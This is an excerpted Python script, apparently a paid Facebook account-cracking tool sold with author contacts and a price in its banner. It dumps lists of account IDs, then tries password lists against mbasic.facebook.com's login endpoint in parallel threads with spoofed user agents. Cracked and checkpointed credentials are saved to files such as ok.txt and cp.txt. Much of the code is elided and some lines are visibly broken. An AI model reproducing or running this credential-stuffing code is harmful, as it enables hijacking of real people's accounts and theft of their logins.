...
from concurrent.futures import ThreadPoolExecutor as ALIabba
from concurrent.futures import ThreadPoolExecutor as Aliabba
from datetime import datetime
from bs4 import BeautifulSoup
...
N = '\033[0m'	# WARNA MATI 
from concurrent.futures import ThreadPoolExecutor as QALIRMahar
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			try:
				Aliagents = random.choice(liners)
			except (KeyError, IOError):
				Aliagents  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mnoor-OK\033[1;32m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;32mnoor-OK\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;92m[\033[1;36mALI\033[1;32m] {loop}/{len(self.id)} \033[1;32m[\033[1;32mOK-{len(ok)}\033[1;32m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;92m[noor-OK] %s | %s â€¢ %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('noor_Cp.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = 15
					...
					pass
				print('\r\033[1;92m[ALI-OK] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('ALI_Cp.txt','a').write('%s\n' % wrt)
				break
			else:
				continue
		loop += 1
	def __pler__(self):
		...
		if yan == '':
			...
			print('\033[1;37m[+]\033[1;36m PROCESS HAS BEEN STARTED')
			print(50*"\033[1;97m_")
			print('      \033[1;97m\033[1;41m [ USE AIRPLANE MODE FOR FAST ] \033[0m\033[1;93m')
			print(50*"\033[1;97m_")
			with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
...
def publiccrack():
    ...
    print(50*"\033[1;97m_")
    _Ali__ = input('\033[1;37m[+] \033[1;32mCHOOSE OPTION : ')
    if _Ali__ in ('1', '01'):
        __cracking__().plerr()
    if _Ali__ in ('0', '00'):
...
class __cracking__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mAli\033[1;32m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mALI-OK\033[1;32m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mALI-OK\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('cp.txt','a').write('%s\n' % wrt)
				break
...
def create_file():
        ...
        try:
            ...
            for inayat in rgq['data']:
                ...
                try:
                    ...
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+' '+last_name+'\n')
            print('\033[1;97m [\033[1;32mAli\033[1;37m] \033[1;36mSUCCESSFULL DUMP FROM\033[1;37m '+ids)
            idsave.close()
    ...
    version()
if not os.path.exists(".adiwork.txt"):
	open(".adiwork.txt", 'w').close()
class load:
    def __init__(self):
        _ = ''
        __ = int('30')
...
\033[1;32mâ========================================================================================================================================================================
\033[1;32mâ”‚\033[1;31mâž£\033[1;37m AUTHOR  \033[1;31m:\033[1;32m mr-sheraz   â”‚\033[1;37mâ€¢ \033[1;36mTHIS TOOL IS PAID \033[1;37mâ€¢\033[1;32m â”‚
\033[1;32mâ”‚\033[1;31mâž£\033[1;37m FACEBOOK\033[1;31m:\033[1;32m  BALOCH   â”‚\033[1;37mâ€¢ \033[1;36mPER MONTH PACKAGE \033[1;37mâ€¢ \033[1;32mâ”‚
\033[1;32mâ”‚\033[1;31mâž£\033[1;37m WHATSAPP\033[1;31m:\033[1;32m +3136751626â”‚\033[1;32mâ”==================================================================================================================================================================================================================
\033[1;32mâ”‚\033[1;31mâž£\033[1;37m YOUTUBE \033[1;31m:\033[1;32m AB356        â”‚\033[1;37m  â€¢ \033[1;36mPRICE \033[1;31m= \033[1;36m300RS \033[1;37mâ€¢   \033[1;32mâ”‚
\033[1;32mâ™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦â™¦
\033[1;32mâ”‚         \033[1;37mâ€¢ THIS TOOL CREATE BY jared & ALI justine \033[1;37mâ€¢      \033[1;32m â”‚
\033[1;32mâ””==============================================================================================================================
ct = datetime.now()
n = ct.month
